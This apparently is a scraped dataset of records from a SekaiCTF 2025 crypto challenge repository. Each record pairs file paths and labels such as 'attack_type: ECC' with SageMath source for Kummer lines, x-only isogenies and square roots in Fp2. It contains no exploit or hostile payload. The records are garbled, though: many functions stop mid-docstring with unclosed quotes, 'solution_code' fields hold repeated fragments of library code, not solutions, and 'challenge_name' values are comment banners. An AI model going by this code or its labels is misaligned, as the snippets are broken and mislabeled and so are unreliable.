# Ensure the parent is the right type\n        if not isinstance(parent, KummerLine):\n            raise TypeError(\"not a Montgomery Kummer line\")\n\n\n        # Point at infinity\n        if coords is None:\n            coords = (Integer(1), Integer(0))\n        # Construct point from P on an elliptic curve in Montgomery form\n        elif isinstance(coords, EllipticCurvePoint_field):\n            # Make sure point's parent curve matches with Kummer Line\n            a = parent.a()\n            assert coords.curve().a_invariants() == (0, a, 0, 1, 0)\n            coords = coords[0], coords[2]\n        # Construct from X coordinate only\n        elif isinstance(coords, RingElement):\n            coords = (coords,)\n        # Construct from a tuple (X : Z)\n        else:\n            coords = tuple(coords)\n\n\n    def __repr__(self):\n        return f\"[{self._X} : {self._Z}]\"\n        # return f\"Kummer Point [{self._X} : {self._Z}] on {self._parent}\"\n\n\n    def __bool__(self):\n        \"\"\"\n        A point represents False if it is the point at infinity and\n        True otherwise\n        \"\"\"\n        return bool(self._Z)\n\n\n    def __eq__(self, other):\n        \"\"\"\n        Equality of two Kummer Points\n        \"\"\"\n        if not isinstance(other, KummerPoint):\n            raise ValueError(\"Can only compare equality between to Kummer Points\")\n        if self._parent != other._parent:\n            return False\n        return self._X * other._Z == other._X * self._Z\n\n\n    def is_zero(self):\n        \"\"\"\n        A Kummer Point is considered Zero if it is the identity point\n        on the parent curve\n        \"\"\"\n        return self._Z == 0\n\n\n    def base_ring(self):\n        \"\"\"\n        Get the base ring of the Kummer Point coordinates\n        \"\"\"\n        return self._base_ring\n\n\n    def parent(self):\n        \"\"\"\n        Get the Kummer Line of which this point is constructed on\n        \"\"\"\n        return self._parent\n\n\n    def XZ(self):\n        \"\"\"\n        Return the projective (X : Z) coordinates of the point\n        \"\"\"\n        return self._X, self._Z\n\n\n    def X(self):\n        return self._X\n    def Z(self):\n        return self._Z\n\n\n    def __iter__(self):\n        return iter(self.XZ())\n\n\n    def x(self):\n        r\"\"\" \"\"\"\n        if not self._Z:\n            raise ValueError(\"The identity point has no valid x-coordinate\")\n        if self._Z == 1:\n            return self._base_ring(self._X)\n        return self._base_ring(self._X / self._Z)\n\n\n    @cached_method\n    def curve_point(self):\n        \"\"\"\n        Deterministically lift an x-coordinate\n        taking the smallest y-coordinate as the\n        chosen root.\n        \"\"\"\n        # Get the Montgomery curve and constant A\n        L = self.parent()\n        E = L.curve()\n        A = L.a()\n\n\n    @staticmethod\n    def xDBL(X, Z, A, C):\n        \"\"\"\n        function for Montgomery doubling with projective curve constant\n\n\n    @staticmethod\n    def xADD(XP, ZP, XQ, ZQ, xPQ, zPQ):\n        \"\"\"\n        function for Montgomery differential addition\n\n\n    @staticmethod\n    def xDBLADD(XP, ZP, XQ, ZQ, xPQ, zPQ, A24, C24):\n        \"\"\"\n        function for step in Montgomery ladder\n        simultaneous doubling and differential addition\n\n\n    @staticmethod\n    def xTPL(XP, ZP, A2):\n        \"\"\"\n        SIKE algorithm 46\n\n\n    def _double(self):\n        \"\"\"\n        Returns [2] self\n        \"\"\"\n        X, Z = self.XZ()\n        A, C = self._parent.extract_constants()\n        X2, Z2 = self.xDBL(X, Z, A, C)\n        return self._parent((X2, Z2))\n\n\n    def double(self):\n        \"\"\"\n        Wrapper function which deals with the doubling of\n        the identity\n\n\n    def _double_iter(self, n):\n        \"\"\"\n        Returns [2^n] self, faster than generic\n        multiplication as we only need doubling,\n        no addition.\n        \"\"\"\n        X, Z = self.XZ()\n        A, C = self._parent.extract_constants()\n        for _ in range(n):\n            X, Z = self.xDBL(X, Z, A, C)\n        return self._parent((X, Z))\n\n\n    def double_iter(self, n):\n        \"\"\"\n        Wrapper function which deals with the repeated\n        doubling\n\n\n    def _triple_iter(self, n):\n        \"\"\"\n        Returns [3^n] self, faster than generic\n        multiplication as we only need doubling,\n        no addition.\n        \"\"\"\n        X, Z = self.XZ()\n        A, C = self._parent.extract_constants()\n        A = A / (2 * C)\n        for _ in range(n):\n            X, Z = self.xTPL(X, Z, A)\n        return self._parent((X, Z))\n\n\n    def triple_iter(self, n):\n        \"\"\"\n        Wrapper function which deals with the repeated\n        tripling\n\n\n    def _add(self, Q, PQ):\n        \"\"\"\n        Performs differential addition assuming\n        P, Q and PQ are all not the point at\n        infinity\n        \"\"\"\n        XP, ZP = self.XZ()\n        XQ, ZQ = Q.XZ()\n        XPQ, ZPQ = PQ.XZ()\n\n\n    def add(self, Q, PQ):\n        \"\"\"\n        Function to perform differential addition and\n        handle the cases when P, Q or PQ are the points\n        at infinity\n        \"\"\"\n        # Adding O + Q = Q\n        if not self._Z:\n            return Q\n\n\n    def __mul__(self, m):\n        \"\"\"\n        Montgomery-ladder to compute [m]P\n\n\n    def __rmul__(self, m):\n        return self * m\n\n\n    def __imul__(self, m):\n        self = self * m\n        return self\n\n\n    def ladder_3_pt(self, xP, xPQ, m):\n        \"\"\"\n        Function to compute xP + [m]xQ using x-only\n        arithmetic. Very similar to the Montgomery ladder above\n\n\n    def multiples(self):\n        \"\"\"\n        A generator of points [l]P for self = P\n        Stops when it has generated the full subgroup generated by P\n        (without the identity point).\n", "tools": ["sage"], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\alter-ego\\dist\\montgomery_isogenies\\kummer_line.py", "file_size": 37056, "scraped_at": "2025-10-26T18:19:39.748257"}
{"id": "project-sekai_sekaictf-2025_============================================_#", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "============================================ #", "attack_type": "Unknown", "writeup": "# ============================================ #\n#     Fast square root and quadratic roots     #\n# ============================================ #\n\n\ndef sqrt_Fp2(a):\n    \"\"\"\n    Efficiently computes the sqrt\n    of an element in Fp2 using that\n    we always have a prime p such that\n    p ≡ 3 mod 4.\n    \"\"\"\n    Fp2 = a.parent()\n    p = Fp2.characteristic()\n    i = Fp2.gen()  # i = √-1\n\n    a1 = a ** ((p - 3) // 4)\n    x0 = a1 * a\n    alpha = a1 * x0\n\n    if alpha == -1:\n        x = i * x0\n    else:\n        b = (1 + alpha) ** ((p - 1) // 2)\n        x = b * x0\n\n    return x\n\n\ndef quadratic_roots(b, c):\n    \"\"\"\n    Computes roots to the quadratic polynomial\n\n        f = x^2 + b * x + c\n\n    Using the quadratic formula\n\n    Just like in school!\n    \"\"\"\n    d2 = b**2 - 4 * c\n    d = sqrt_Fp2(d2)\n    return ((-b + d) / 2, -(b + d) / 2)\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\alter-ego\\dist\\utilities\\fast_roots.py", "file_size": 841, "scraped_at": "2025-10-26T18:19:39.750084"}
{"id": "project-sekai_sekaictf-2025_Sage_imports", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "Sage imports", "attack_type": "ECC", "writeup": "\"\"\"\nUnderneath everything, our isogenies are on the Kummer line\n\nL : x^3 + Ax^2 + x\n\nAnd we perform our x-only isogenies by working with the x-coordinates\nrepresented projectively as x(P) = (X : Z) which we call KummerPoints\n\nHowever, for FESTA(+) we always need the full point eventually for either\nadditions or the (2,2)-isogeny, so we need a way to recover the full point.\n\nThe trick we use is that we always evaluate our isogenies on torsion bases, \nso we can use the Weil pairing to recover phi(P) up to an overall sign.\n\nThis file takes elliptic curves and points on these curves, maps them to the\nKummer line, performs fast x-only isogeny computations and then lifts the\nresult back to full points on the codomain curves.\n\"\"\"\n\n# Sage imports\nfrom sage.all import gcd, randint\nfrom sage.structure.element import RingElement\n\n# Local Imports\nfrom montgomery_isogenies.kummer_line import KummerLine\nfrom montgomery_isogenies.kummer_isogeny import KummerLineIsogeny\nfrom utilities.supersingular import torsion_basis\nfrom utilities.pairing import weil_pairing_pari\n\n# =========================================================== #\n#    Compute an isogeny and codomain using x-only algorithms  #\n# =========================================================== #\n\ndef _random_isogeny_x_only(E, D):\n    \"\"\"\n    Helper function to compute one step in the isogeny\n    chain for `random_isogeny_x_only`. \n    \"\"\"\n    # Compute a random point of order D to act as our\n    # isogeny kernel\n    k = randint(0, D)\n    P, Q = torsion_basis(E, D)\n    K = P + k*Q\n\n    # Map curve and kernel to Kummer Line\n    L = KummerLine(E)\n    xK = L(K[0])\n\n    # Use x-only arithmetic to compute an isogeny \n    # and codomain\n    phi = KummerLineIsogeny(L, xK, D)\n\n    # Compute the curve from the Kummer Line\n    codomain = phi.codomain().curve()\n\n    # Speed up SageMath by setting the order of the curve\n    p = E.base_ring().characteristic()\n    codomain.set_order((p+1)**2, num_checks=0)\n    \n    return phi, codomain\n\ndef random_isogeny_x_only(E, D):\n    \"\"\"\n    Computes a D-degree isogeny from E using\n    x-only arithmetic and returns the KummerIsogeny\n    together with the codomain curve.\n\n    When D does not divide the available torsion,\n    the isogeny is computed in steps with the \n    helper function _random_isogeny_x_only\n    \"\"\"\n    deg = 1\n    phi_list = []\n    p = E.base_field().characteristic()\n\n    # Compute isogenies of degree gcd(D // deg, p+1)\n    # until an isogeny of degree D is computed\n    while deg != D:\n        next_deg = gcd(D // deg, p+1)\n        phi, E = _random_isogeny_x_only(E, next_deg)\n        deg *= next_deg\n\n        phi_list.append(phi)\n    \n    # Create a composite x-only isogeny from factors\n    phi = KummerLineIsogeny.from_factors(phi_list)\n    return phi, E\n\ndef isogeny_from_scalar_x_only(E, D, m, basis=None):\n    \"\"\"\n    Computes a D-degree isogeny from E using\n    x-only arithmetic and returns the KummerIsogeny\n    together with the codomain curve.\n\n    The isogeny has a kernel K which is computed from\n    the canonical basis E[D] = <P,Q> and given scalar(s)\n    of the form:\n        K = P + [m]Q     or     K = [a]P + [b]Q\n    depending on whether m is a scalar, or a length two \n    tuple of scalars\n    \"\"\"\n    # Allow a precomputed basis\n    if not basis:\n        P, Q = torsion_basis(E, D)\n    else:\n        P, Q = basis\n\n    # Allow either an integer or tuple of integers\n    if isinstance(m, RingElement) or isinstance(m, int):\n        K = P + m*Q\n    else:\n        assert len(m) == 2\n        K = m[0]*P + m[1]*Q\n\n    # Map curve and kernel to Kummer Line\n    L = KummerLine(E)\n    xK = L(K)\n\n    # Use x-only arithmetic to compute an isogeny \n    # and codomain\n    phi = KummerLineIsogeny(L, xK, D)\n\n    # Compute the curve from the Kummer Line\n    codomain = phi.codomain().curve()\n\n    # Speed up SageMath by setting the order of the curve\n    p = E.base_ring().characteristic()\n    codomain.set_order((p+1)**2, num_checks=0)\n\n    return phi, codomain\n\n# ================================================= #\n#    Evaluate an x-only isogeny on a torsion basis  #\n# ================================================= #\n\ndef lift_image_to_curve(P, Q, ximP, ximQ, n, d):\n    \"\"\"\n    Given the torsion basis <P, Q> = E[n]\n    and the x-coordinates of the images x(phi(P))\n    and x(phi(P)) of a degree d-isogeny compute \n    the image of the full points up to an overall sign:\n        ±phi(P), ±phi(Q)\n    \"\"\"\n    # Lift the points to the curve\n    imPb = ximP.curve_point()\n    imQb = ximQ.curve_point()\n    \n    # Compute two pairings\n    pair_E0 = weil_pairing_pari(P, Q, n)\n    pair_E1 = weil_pairing_pari(imPb, imQb, n)\n    \n    # Correct the sign\n    if pair_E0**d != pair_E1:\n        imQb = -imQb\n\n    return imPb, imQb\n\ndef evaluate_isogeny_x_only(phi, P, Q, n, d):\n    \"\"\"\n    Given an x-only isogeny phi degree d, and the torsion basis\n    <P,Q> = E[n], compute the image of the torsion basis up to\n    and overall sign: ±phi(P), ±phi(Q)\n\n    Does", "solution_code": "    # Compute the curve from the Kummer Line\n    codomain = phi.codomain().curve()\n\n\n    \"\"\"\n    Computes a D-degree isogeny from E using\n    x-only arithmetic and returns the KummerIsogeny\n    together with the codomain curve.\n\n\n    # Create a composite x-only isogeny from factors\n    phi = KummerLineIsogeny.from_factors(phi_list)\n    return phi, E\n\n\n    \"\"\"\n    Computes a D-degree isogeny from E using\n    x-only arithmetic and returns the KummerIsogeny\n    together with the codomain curve.\n\n\n    # Compute the curve from the Kummer Line\n    codomain = phi.codomain().curve()\n\n\n    # Extract x-coordinates from points and convert to KummerPoints\n    xP, xQ = L0(P[0]), L0(Q[0])\n", "tools": ["sage"], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\alter-ego\\challenge\\app\\montgomery_isogenies\\isogenies_x_only.py", "file_size": 5513, "scraped_at": "2025-10-26T18:19:39.752576"}
{"id": "project-sekai_sekaictf-2025_Sage_imports", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "Sage imports", "attack_type": "ECC", "writeup": "\"\"\"\nImplementation of x-only isogenies between the Kummer Lines of \nMontgomery Curves\n\nTaken from:\nhttps://github.com/jack4818/KummerIsogeny\n\n===========================================================================\n\nUSAGE:\n\nphi = KummerLineIsogeny(domain, kernel, degree)\n\nThe codomain is accessed using `phi.codomain()` and the  elliptic curve \ncan be lifted from the KummerLine `phi.dodomain().curve()`.\n\nEvaluation of the isogeny is done via `phi(xQ)` for some KummerPoint `xQ`.\n\nNOTE:\n\nWhere the degree can be composite, but for efficiency needs to be smooth.\nFor a 2-isogeny, the point P = (0,0) cannot be used as a kernel \n\n========================================================================\n\nINFO:\n\nHeavily inspired by the SageMath isogeny classes, this file implements\nx-only Montgomery isogenies using the KummerLine and KummerPoint classes\nfrom `kummer_line.py` for the (co)domains and kernel points.\n\nThe algorithms in this file all come from the following literature:\n\nVélu-like algorithms:\n\n    Even torsion algorithms from: https://ia.cr/2017/1198\n    Computing Isogenies between Montgomery Curves Using the Action of (0, 0)\n    Joost Renes\n\n    Odd torsion algorithms: https://ia.cr/2017/504.pdf\n    A simple and compact algorithm for SIDH with arbitrary degree isogenies\n    Craig Costello and Huseyin Hisil\n\n    Codomain computation for velu formula from: https://ia.cr/2018/782\n    A faster way to the CSIDH\n    Michael Meyer and Steffen Reith\n\nVéluSqrt for large ell isogenies \n\n    VéluSqrt: https://velusqrt.isogeny.org/\n    Faster computation of isogenies of large prime degree\n    Daniel J. Bernstein, Luca De Feo, Antonin Leroux, Benjamin Smith\n\nFuture Work: \n\n- Optimise VéluSqrt, it seems to be underperforming with a threshold of about 1000\n  rather than 100 \n- Include isomorphisms of Kummer Lines\n- allow composition by defining __mul__ on isogenies to create a composite isogeny\n\"\"\"\n\n# Sage imports\nfrom sage.all import prod, ZZ, PolynomialRing\nfrom sage.rings.generic import ProductTree\n\n# Local imports\nfrom montgomery_isogenies.kummer_line import KummerLine, KummerPoint\n\n# =================================================== #\n# Generic class for creating an isogeny between       #\n# KummerLines of Montgomery model curves using x-only #\n# arithmetic                                          #\n# =================================================== #\n\n\nclass KummerLineIsogeny_Generic:\n    \"\"\"\n    Generic class for Kummer Line isogenies which we build on top of for\n    the Vélu, VéluSqrt and Composite isogeny classes\n    \"\"\"\n\n    def __init__(self):\n        self._degree = None\n        self._domain = None\n        self._codomain = None\n        pass\n\n    def __repr__(self):\n        return f\"Isogeny of degree {(self._degree).factor()} from {self._domain} to {self._codomain}\"\n\n    @staticmethod\n    def validate_input(domain, kernel, degree, check=True):\n        \"\"\"\n        Helper function to check the input to the isogeny class is well-formed\n        \"\"\"\n        if not isinstance(domain, KummerLine):\n            raise ValueError(f\"not a kummer line: {domain}\")\n\n        if not isinstance(kernel, KummerPoint):\n            raise ValueError(f\"not a kummer point: {kernel}\")\n\n        if kernel.parent() != domain:\n            raise ValueError(f\"Kernel {kernel} is not a point on {domain}\")\n\n        if check:\n            # TODO actually check order with has_order_D function\n            assert (\n                degree * kernel\n            ).is_zero(), \"Input point does not have correct order\"\n\n    def domain(self):\n        \"\"\"\n        Return the domain of the isogeny\n        \"\"\"\n        return self._domain\n\n    def codomain(self):\n        \"\"\"\n        Return the codomain of the isogeny\n        \"\"\"\n        return self._codomain\n\n    def degree(self):\n        \"\"\"\n        Return the degree of the isogeny\n        \"\"\"\n        return self._degree\n\n\n# =================================================== #\n# Computation of isogenies between Kummer lines using #\n# x-only formula by Costello-Hisil-Renes              #\n# =================================================== #\n\n\nclass KummerLineIsogeny_Velu(KummerLineIsogeny_Generic):\n    \"\"\"\n    Computes prime degree isogenies with Vélu-like formula.\n\n    - When ell is odd, we use Costello-Hisil (https://ia.cr/2017/504)\n    - When ell is even, we can use Renes (https://ia.cr/2017/1198) providing\n    that the kernel is not (0,0)\n\n    TODO: use isomorphisms to change the model of the curve if (0,0) is a\n    kernel point\n    \"\"\"\n\n    def __init__(self, domain, kernel, degree, check=True):\n        # Check the input to the isogeny is well-formed\n        self.validate_input(domain, kernel, degree, check=check)\n\n        # Set kernel and degree and domain\n        self._degree = degree\n        self._kernel = kernel\n        self._domain = domain\n\n        # Compute the codomain, we need different formula for even and\n        # odd degree\n        if self._degree == 2:\n            # We cannot use the", "solution_code": "    def __init__(self):\n        self._degree = None\n        self._domain = None\n        self._codomain = None\n        pass\n\n\n    def __repr__(self):\n        return f\"Isogeny of degree {(self._degree).factor()} from {self._domain} to {self._codomain}\"\n\n\n    @staticmethod\n    def validate_input(domain, kernel, degree, check=True):\n        \"\"\"\n        Helper function to check the input to the isogeny class is well-formed\n        \"\"\"\n        if not isinstance(domain, KummerLine):\n            raise ValueError(f\"not a kummer line: {domain}\")\n\n\n    def domain(self):\n        \"\"\"\n        Return the domain of the isogeny\n        \"\"\"\n        return self._domain\n\n\n    def codomain(self):\n        \"\"\"\n        Return the codomain of the isogeny\n        \"\"\"\n        return self._codomain\n\n\n    def degree(self):\n        \"\"\"\n        Return the degree of the isogeny\n        \"\"\"\n        return self._degree\n\n\n    def __init__(self, domain, kernel, degree, check=True):\n        # Check the input to the isogeny is well-formed\n        self.validate_input(domain, kernel, degree, check=check)\n\n\n    def __call__(self, P):\n        \"\"\"\n        phi(xP) evaluates the Kummer point xP\n        \"\"\"\n        if not isinstance(P, KummerPoint):\n            raise ValueError\n        if self._degree == 2:\n            return self._evaluate_isogeny_even(P)\n        return self._evaluate_isogeny(P)\n\n\n    def _precompute_edwards_multiples(self, d):\n        \"\"\"\n        These multiples are used in both codomain\n        computation and isogeny evaluation. We precompute\n        them once during initialisation and we can then\n        reuse them for every evaluation\n        \"\"\"\n        # Compute the [i]K for i in [1...d]\n        K_muls = self._kernel.multiples()\n        E_muls = []\n        for _ in range(d):\n            Ki = next(K_muls)\n            KX, KZ = Ki.XZ()\n            YE = KX - KZ\n            ZE = KX + KZ\n            E_muls.append((YE, ZE))\n        return E_muls\n\n\n    def _compute_codomain_constants(self):\n        \"\"\"\n        When ell is odd, we compute the codomain using the Meyer and Reith\n        Twised Edwards trick (https://ia.cr/2018/782)\n        \"\"\"\n        # Extract Montgomery constants\n        A, C = self._domain.extract_constants()\n\n\n    def _compute_codomain_constants_even(self):\n        \"\"\"\n        When ell is even, we compute the codomain constants\n        using Renes formula\n        \"\"\"\n        # Extract kernel point\n        XK, ZK = self._kernel.XZ()\n        assert XK, \"XK Cannot be zero\"\n\n\n    def _compute_codomain(self):\n        \"\"\"\n        Wrapper function to compute the codomain L = x^3 + x^2A' + x in\n        projective coordinates: A' = (A' : C') We use different formula\n        depending on whether the isogeny degree ell is even or odd\n        \"\"\"\n        # Compute the codomain constants, need different formula for\n        # odd and even ell\n        if self._degree == 2:\n            A_codomain, C_codomain = self._compute_codomain_constants_even()\n        else:\n            A_codomain, C_codomain = self._compute_codomain_constants()\n\n\n    def _evaluate_isogeny(self, P):\n        \"\"\"\n        Costello-Hisil (https://ia.cr/2017/504) formula for\n        evaluating an odd degree isogeny on the point P\n        \"\"\"\n        XP, ZP = P.XZ()\n        Psum = XP + ZP\n        Pdiff = XP - ZP\n\n\n        # Loop through the d-multiples, these are\n        # precomputed from the codomain computation\n        X_new, Z_new = 1, 1\n        for EY, EZ in self._edwards_multiples:\n            diff_EZ = Pdiff * EZ\n            sum_EY = EY * Psum\n            X_new *= diff_EZ + sum_EY\n            Z_new *= diff_EZ - sum_EY\n\n\n    def _evaluate_isogeny_even(self, P):\n        \"\"\"\n        Renes (https://ia.cr/2017/1198) formula for\n        evaluating an even degree isogeny on the point P\n        \"\"\"\n        XK, ZK = self._kernel.XZ()\n        assert XK, \"XK cannot be zero\"\n\n\n    r\"\"\"\n    Helper function to evaluate a resultant with `h_I` quickly,\n    using the product tree, taken from FastEllipticPolynomial\n    sage/src/sage/schemes/elliptic_curves/hom_velusqrt.py\n\n\n    def __init__(self, domain, kernel, degree, check=True):\n        # Check the input to the isogeny is well-formed\n        self.validate_input(domain, kernel, degree, check=check)\n\n\n    def __call__(self, P):\n        \"\"\"\n        Evaluate the isogeny phi on the point P\n        by using phi(P)\n        \"\"\"\n        if not isinstance(P, KummerPoint):\n            raise ValueError\n        return self._evaluate_isogeny(P)\n\n\n    def _hI_resultant(self, poly):\n        \"\"\"\n        Compute the resultant Res(hI, poly) where\n        hI has been computed and stored as a product tree\n        \"\"\"\n        return product_tree_resultant(self.hI_tree, poly)\n\n\n    def _hI_precomputation(self, ker, b, c):\n        r\"\"\"\n        Compute the polynomial\n\n\n    def _Fs(self, X1, X2):\n        \"\"\"\n        Elliptic Resultants for Montgomery curves\n        \"\"\"\n        X1X2 = X1 * X2\n        polys = (\n            (X1 - X2) ** 2,\n            -2 * ((X1X2 + 1) * (X1 + X2) + 2 * self.a * X1X2),\n            (X1X2 - 1) ** 2,\n        )\n        return polys\n\n\n    def _EJ_precomputation(self, ker, b):\n        \"\"\"\n        The polynomials for EJ are of the form\n\n\n    def _hK_precomputation(self, ker, ell, b, c):\n        r\"\"\"\n        Compute the polynomial\n\n\n    def _compute_codomain_constants(self):\n        \"\"\"\n        Compute the codomain constant in projective coordinates\n        (A : C) using the VéluSqrt adaptation of the Meyers-Reith\n        Twisted Edwards curve trick\n        \"\"\"\n        # These are the polynomials for alpha = 1 and alpha = -1\n        E0J = prod(F0 + F1 + F2 for F0, F1, F2 in self.EJ_parts)\n        E1J = prod(F0 - F1 + F2 for F0, F1, F2 in self.EJ_parts)\n\n\n    def _compute_codomain(self):\n        \"\"\"\n        Wrapper function to compute the codomain L = x^3 + x^2A' + x in\n        projective coordinates: A' = (A' : C')\n        \"\"\"\n        A_codomain, C_codomain = self._compute_codomain_constants()\n        F = self._domain.base_ring()\n        return KummerLine(F, [A_codomain, C_codomain])\n\n\n    def _evaluate_isogeny(self, P):\n        \"\"\"\n        Evaluate the isogeny phi at the point P\n\n\n        # Compute two polynomials from giant steps\n        EJ1 = prod((F0 * alpha + F1) * alpha + F2 for F0, F1, F2 in self.EJ_parts)\n        EJ0 = EJ1.reverse()\n\n\n    - Uses the sparse strategy from the SIDH paper for computing\n      prime power degree isogenies\n    - Uses VéluSqrt when the prime order isogeny has degree > threshold\n    \"\"\"\n\n\n    def sparse_isogeny_prime_power(P, l, e, split=0.8, threshold=1000):\n        \"\"\"\n        Compute chain of isogenies quotienting\n        out a point P of order l**e\n        https://trac.sagemath.org/ticket/34239\n        \"\"\"\n\n\n        def recursive_sparse_isogeny(Q, k):\n            assert k\n            if k == 1:  # base case\n                return [KummerLineIsogenyAlgorithm(Q.parent(), Q, l, check=False)]\n\n\n    # TODO: Deal with isomorphisms\n    # Easy option: just use the Sage isomorphisms from K.curve() and map down\n    # Better option: just write the isomorphisms of Montgomery curves\n    # I have these computed for the FESTA code, so I just have to move them\n    # around!\n    if cofactor == 1:\n        raise NotImplementedError(\n            \"Isomorphisms between Kummer Lines are not yet implemented\"\n        )\n\n\n    def __init__(self, domain, kernel, degree, check=True, threshold=1500):\n        # Check the input to the isogeny is well-formed\n        self.validate_input(domain, kernel, degree, check=check)\n\n\n    def __call__(self, P):\n        \"\"\"\n        Evaluate the composite isogeny by calling phi(P)\n        \"\"\"\n        return evaluate_factored_kummer_isogeny(self._phis, P)\n\n\n    @classmethod\n    def from_factors(cls, maps):\n        \"\"\"\n        Sometimes we will have factors of some isogeny from a\n        different context and we want to simply collect them\n        together to create a single object.\n", "tools": ["sage"], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\alter-ego\\challenge\\app\\montgomery_isogenies\\kummer_isogeny.py", "file_size": 23805, "scraped_at": "2025-10-26T18:19:39.772389"}
{"id": "project-sekai_sekaictf-2025_===================================================_#", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "=================================================== #", "attack_type": "ECC", "writeup": "\"\"\"\nImplementation of the Kummer Line of Montgomery Curves and the corresponding\nKummer Points used for x-only Montgomery curve arithmetic\n\nTaken from:\nhttps://github.com/jack4818/KummerIsogeny\n\n===========================================================================\n\nINFO: Construction\n\nA KummerLine can be constructed straight from a Montgomery curve:\n\nE = EllipticCurve(F, [0,A,0,1,0])\nK = KummerLine(E)\n\nOr, it can be constructed from the Montgomery coefficient\n\nK = KummerLine(F, A)\n\nAdditionally, we allow A = (A : C) to be stored projectively and\nwe can construct this by\n\nK = KummerLine(F, [A, C])\n\nA KummerPoint can be constructed from coordinates\n\nxP = K(X, Z)\n\nWhere x(P) = (X : Z) is the x-coordinate in projective XZ-coordinates\n\nA KummerPoint can also be made straight from an elliptic curve point\n\nE = EllipticCurve(F, [0,A,0,1,0])\nP = E.random_point()\n\nK = KummerLine(E)\nxP = K(P)\n\n===========================================================================\n\nINFO: Usage\n\nThe methods of the KummerLine class are fairly straight-forward. Currently\nmissing is a check for whether two curves are isomorphic over the base field.\n\nFor this, we need an isomorphism between KummerLines which is a TODO.\n\nFor the points, scalar multiplication is performed by n*xP\n\nAdditionally, one can call `xP.double()` to perform x-only point addition\nand xP.add(xQ, xPQ) to perform differential addition to recover xP + xQ\nwhere xPQ = x(P - Q).\n\nThe 3 point ladder `xQ.ladder_3_pt(xP, xPQ, m) computes xP + [m]xQ\n\nxP.multiples() generates values [l]xP by repeated differential addition. This\nis used for isogeny computations where we want to collect the the first d points\nfor an isogeny of degree ell = 2d+1.\n\"\"\"\nimport cypari2\n\npari = cypari2.Pari()\n\nfrom sage.all import cached_method, Integer, EllipticCurve\n\nfrom sage.structure.element import RingElement\nfrom sage.schemes.elliptic_curves.ell_generic import EllipticCurve_generic\nfrom sage.schemes.elliptic_curves.ell_point import EllipticCurvePoint_field\n\nfrom utilities.fast_roots import sqrt_Fp2\n\n# =================================================== #\n#     Class for the Kummer Line x(x^2 + Ax + 1)       #\n# =================================================== #\n\n\nclass KummerLine:\n    def __init__(self, *args):\n        self._curve = None\n\n        # Allow the creation of the Kummer Line from an EllipticCurve\n        if len(args) == 1:\n            (curve,) = args\n            if not isinstance(curve, EllipticCurve_generic):\n                raise TypeError(\"not an elliptic curve\")\n            ainvs = curve.a_invariants()\n            A, C = ainvs[1], 1\n            if ainvs != (0, A, 0, 1, 0):\n                raise ValueError(\"Must use Montgomery model\")\n            self._curve = curve\n            self._base_ring = curve.base_ring()\n\n        # Allow the creation of the Kummer line from a base field and coeffs.\n        elif len(args) == 2:\n            base_ring, curve_constants = args\n            # Extract curve constants\n            if isinstance(curve_constants, Integer) or len(curve_constants) == 1:\n                A = curve_constants\n                C = 1\n            elif len(curve_constants) == 2:\n                A, C = curve_constants\n            else:\n                raise ValueError(\n                    \"The Montgomery coefficient must either be a single scalar a, or\\\n                    a tuple [A, C] representing a = A/C.\"\n                )\n            self._base_ring = base_ring\n        else:\n            raise ValueError(\n                \"A Kummer Line must be constructed from either a Montgomery curve, or\\\n                    a base field and tuple representing the coefficient A/C = [A, C]\"\n            )\n\n        # init variables\n        self._A = self._base_ring(A)\n        self._C = self._base_ring(C)\n\n        self._A = pari(A)\n        self._C = pari(C)\n\n        # Make sure the curve is not singular\n        if (self._A**2 - 4 * self._C**2) == 0:\n            raise ValueError(\n                f\"Constants {curve_constants} do not define a Montgomery curve\"\n            )\n\n    def __eq__(self, other):\n        \"\"\"\n        Test equality of two curves\n        \"\"\"\n        if self.base_ring() != other.base_ring():\n            return False\n        return self._A * other._C == other._A * self._C\n\n    def __repr__(self):\n        \"\"\"\n        String representation of the class\n        \"\"\"\n        if self.a():\n            return f\"Kummer line of the Montgomery curve y^2 = x^3 + {self.a()}*x^2 + x over {self.base_ring()}\"\n        else:\n            return f\"Kummer line of the Montgomery curve y^2 = x^3 + x over {self.base_ring()}\"\n\n    def __call__(self, coords):\n        \"\"\"\n        Create a Kummer Point with this Kummer Line as the parent\n        \"\"\"\n        return KummerPoint(self, coords)\n\n    def base_ring(self):\n        \"\"\"\n        Return the base ring of the Kummer Line\n        \"\"\"\n        return self._base_ring\n\n    def extract_constants(self):\n        \"\"\"\n        Return the Montgomery coe", "solution_code": "    def __init__(self, *args):\n        self._curve = None\n\n\n        # Allow the creation of the Kummer Line from an EllipticCurve\n        if len(args) == 1:\n            (curve,) = args\n            if not isinstance(curve, EllipticCurve_generic):\n                raise TypeError(\"not an elliptic curve\")\n            ainvs = curve.a_invariants()\n            A, C = ainvs[1], 1\n            if ainvs != (0, A, 0, 1, 0):\n                raise ValueError(\"Must use Montgomery model\")\n            self._curve = curve\n            self._base_ring = curve.base_ring()\n\n\n        # Allow the creation of the Kummer line from a base field and coeffs.\n        elif len(args) == 2:\n            base_ring, curve_constants = args\n            # Extract curve constants\n            if isinstance(curve_constants, Integer) or len(curve_constants) == 1:\n                A = curve_constants\n                C = 1\n            elif len(curve_constants) == 2:\n                A, C = curve_constants\n            else:\n                raise ValueError(\n                    \"The Montgomery coefficient must either be a single scalar a, or\\\n                    a tuple [A, C] representing a = A/C.\"\n                )\n            self._base_ring = base_ring\n        else:\n            raise ValueError(\n                \"A Kummer Line must be constructed from either a Montgomery curve, or\\\n                    a base field and tuple representing the coefficient A/C = [A, C]\"\n            )\n\n\n    def __eq__(self, other):\n        \"\"\"\n        Test equality of two curves\n        \"\"\"\n        if self.base_ring() != other.base_ring():\n            return False\n        return self._A * other._C == other._A * self._C\n\n\n    def __repr__(self):\n        \"\"\"\n        String representation of the class\n        \"\"\"\n        if self.a():\n            return f\"Kummer line of the Montgomery curve y^2 = x^3 + {self.a()}*x^2 + x over {self.base_ring()}\"\n        else:\n            return f\"Kummer line of the Montgomery curve y^2 = x^3 + x over {self.base_ring()}\"\n\n\n    def __call__(self, coords):\n        \"\"\"\n        Create a Kummer Point with this 